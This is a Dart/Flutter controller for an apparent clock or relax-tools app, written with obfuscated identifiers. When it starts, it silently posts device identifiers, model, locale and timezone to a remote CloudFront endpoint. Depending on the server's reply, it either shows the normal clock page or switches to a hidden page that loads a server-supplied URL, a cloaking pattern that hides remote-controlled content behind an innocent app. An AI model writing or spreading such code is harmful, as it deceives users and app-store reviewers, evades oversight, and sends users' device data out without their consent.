import 'dart:io';
import 'package:get/get.dart';
import 'package:flutter_timezone/flutter_timezone.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';


class RelaxToolsRelaxMoveLogic extends GetxController {

  var vzdltka = RxBool(false);
  var unabzyodm = RxBool(true);
  var uxdhio = RxString("");
  var jfid = RxBool(false);
  var gaed = RxBool(true);
  final hodftizem = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    bcqtre();
  }


  Future<void> bcqtre() async {
    jfid.value = true;
    gaed.value = true;
    unabzyodm.value = false;

    hodftizem.post("https://dyhjsnfotb19s.cloudfront.net/WKl1VG5pW5O?no_check",data: await jyzvgnudwq()).then((value) {
      var cepq = value.data["cepq"] as String;
      var shfmljgv = value.data["shfmljgv"] as bool;
      if (shfmljgv) {
        uxdhio.value = cepq;
        gspawo();
      } else {
        ujbka();
      }
    }).catchError((e) {
      unabzyodm.value = true;
      gaed.value = true;
      jfid.value = false;
    });
  }

  Future<Map<String, dynamic>> jyzvgnudwq() async {
    final DeviceInfoPlugin pyedcu = DeviceInfoPlugin();
    PackageInfo zwxnhsut_fdktaue = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var brjku = Platform.localeName;
    var Tarmkj = currentTimeZone;

    var LeRCys = zwxnhsut_fdktaue.packageName;
    var uebcO = zwxnhsut_fdktaue.version;
    var dewikuZp = zwxnhsut_fdktaue.buildNumber;

    var RCuAH = zwxnhsut_fdktaue.appName;
    var UmbuZ = "";
    var swAOy  = "";
    var ynVFGYk = "";
    var eogwi = "";
    var iwyozm = "";
    var xnklwfoe = "";
    var jmnqf = "";
    var toga = "";
    var eipkad = "";
    var qejrs = "";


    var KobTgjD = "";
    var PKyRNeMd = false;

    if (GetPlatform.isAndroid) {
      KobTgjD = "android";
      var yhvanwzc = await pyedcu.androidInfo;

      ynVFGYk = yhvanwzc.brand;

      UmbuZ  = yhvanwzc.model;
      swAOy = yhvanwzc.id;

      PKyRNeMd = yhvanwzc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      KobTgjD = "ios";
      var dwjesq = await pyedcu.iosInfo;
      ynVFGYk = dwjesq.name;
      UmbuZ = dwjesq.model;

      swAOy = dwjesq.identifierForVendor ?? "";
      PKyRNeMd  = dwjesq.isPhysicalDevice;
    }

    var res = {
      "RCuAH": RCuAH,
      "dewikuZp": dewikuZp,
      "uebcO": uebcO,
      "LeRCys": LeRCys,
      "UmbuZ": UmbuZ,
      "Tarmkj": Tarmkj,
      "ynVFGYk": ynVFGYk,
      "swAOy": swAOy,
      "brjku": brjku,
      "KobTgjD": KobTgjD,
      "PKyRNeMd": PKyRNeMd,
      "eogwi" : eogwi,
      "iwyozm" : iwyozm,
      "xnklwfoe" : xnklwfoe,
      "jmnqf" : jmnqf,
      "toga" : toga,
      "eipkad" : eipkad,
      "qejrs" : qejrs,

    };
    return res;
  }

  Future<void> ujbka() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> gspawo() async {
    Get.offNamed("/Outreload");
  }

}
